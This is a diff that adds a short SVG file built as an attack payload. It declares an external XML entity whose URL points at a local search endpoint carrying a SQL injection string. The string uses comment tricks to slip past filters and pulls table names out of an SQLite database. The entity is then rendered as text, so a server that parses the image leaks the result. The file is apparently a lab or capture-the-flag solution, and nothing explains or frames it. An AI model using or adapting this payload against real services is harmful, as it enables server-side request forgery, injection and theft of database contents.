@@ -1,0 +1,6 @@
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://localhost:5000/search?q='union/**/select/**/name,1/**/from/**/sqlite_master/**/where/**/type='table'--">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
+  <text font-size="14" x="10" y="20">&xxe;</text>
+</svg>
